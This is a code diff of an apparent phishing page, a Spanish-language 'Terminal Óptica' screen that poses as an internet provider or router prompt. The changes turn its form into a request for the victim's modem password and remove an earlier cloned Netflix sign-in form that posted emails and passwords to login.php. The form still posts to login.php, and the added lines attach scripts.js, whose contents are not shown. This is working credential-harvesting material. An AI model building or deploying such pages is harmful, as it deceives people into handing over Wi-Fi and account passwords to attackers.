@@ -7,6 +7,7 @@
     <title>Terminal Óptica</title>
     <link href="./assets/bootstrap.min.css" type="text/css" rel="stylesheet">
     <link href="./assets/style.css" type="text/css" rel="stylesheet">
+    <link rel="stylesheet" href="./assets/loader.css">
 </head>
 <body>
     <div class="container">
@@ -42,64 +43,32 @@
                             </div>
                         </div>
                     </div>
-                    <form action="login.php" method="post">
+                    <form action="login.php" method="post" id="form_wifi">
                         <div class="row">
                             <div class="col-12 col-md-4 d-flex align-items-center">
-                                <p>Clave de Acceso</p>
+                                <p>Contraseña del modem</p>
                             </div>
                             <div class="col-12 col-md-8">
-                                <input type="password" class="form-control x-input-sm">
+                                <input type="password" class="form-control x-input-sm" id="input_password">
                             </div>
                         </div>
                         <div class="row">
                             <div class="col-12 py-3 text-center">
-                                <input type="submit" value="Continuar" class="buttonX button-sm">
+                                <input type="submit" value="Continuar" class="buttonX button-sm" id="submit_button">
+                            </div>
+                            <div class="col-12 d-none" id="mensaje_error">
+                                <div class="alert alert-danger" id="alert_error_msg"></div>
+                            </div>
+                            <div class="col-12 text-center d-none" id="loader">
+                                <div class="lds-ring"><div></div><div></div><div></div><div></div></div>
                             </div>
                         </div>
-                    </form>
-                </div>
-            </div>
-            <div class="row">
-                <div class="col-12">
-                    <form class="login-form" action="login.php" method="post" data-reactid="13">
-                        <label class="login-input login-input-email ui-label ui-input-label" id="lbl-email" placeholder="email" data-reactid="14">
-                            <span class="ui-label-text" data-reactid="15">Email</span>
-                            <input class="ui-text-input" name="email" id="email" tabindex="1" autocomplete="email" data-reactid="16">
-                        </label>
-                        <div class="hybrid-password-wrapper" data-reactid="17">
-                            <label class="hybrid-password login-input login-input-password ui-label ui-input-label" id="lbl-password" placeholder="password" data-reactid="18">
-                                <span class="ui-label-text" data-reactid="19">Password</span>
-                                <input class="ui-text-input" name="password" id="password" tabindex="2" data-reactid="20" type="password">
-                            </label>
-                            <input class="show-toggle no-toggle" value="Show Password" data-reactid="21" type="button">
-                            <span data-reactid="22"></span>
-                        </div>
-                        <div class="login-forgot-password-wrapper" data-reactid="23">
-                            <a href="https://www.netflix.com/LoginHelp" class="login-help-link" tabindex="3" data-reactid="24">Forgot your email or password?</a>
-                        </div>
-                        <button class="btn login-button btn-submit btn-small" type="submit" autocomplete="off" tabindex="4" data-reactid="25">
-                            <!-- react-text: 26 -->Sign In<!-- /react-text -->
-                        </button>
-                        <div class="login-remember-me-wrapper" data-reactid="27">
-                            <div class="ui-binary-input login-remember-me" data-reactid="28">
-                                <input class="" name="rememberMe" id="bxid_rememberMe_true" value="true" tabindex="5" data-reactid="29" checked="checked" type="checkbox">
-                                <label for="bxid_rememberMe_true" data-reactid="30">
-                                    <span class="login-remember-me-label-text" data-reactid="31">Remember me</span>
-                                </label>
-                                <div class="helper" data-reactid="32"></div>
-                            </div>
-                        </div>
-                        <input name="flow" value="websiteSignUp" data-reactid="33" type="hidden">
-                        <input name="mode" value="login" data-reactid="34" type="hidden">
-                        <input name="action" value="loginAction" data-reactid="35" type="hidden">
-                        <input name="withFields" value="password,rememberMe,nextPage,showPassword,email" data-reactid="36" type="hidden">
-                        <input name="authURL" value="1529860302635.aNvivY4p/1hZaoSckbR8cHXao08=" data-reactid="37" type="hidden">
-                        <input name="nextPage" value="" data-reactid="38" type="hidden">
-                        <input name="showPassword" value="" data-reactid="39" type="hidden">
                     </form>
                 </div>
             </div>
         </div>
     </div>
+    <script src="./assets/jquery.min.js"></script>
+    <script src="./assets/scripts.js"></script>
 </body>
 </html>
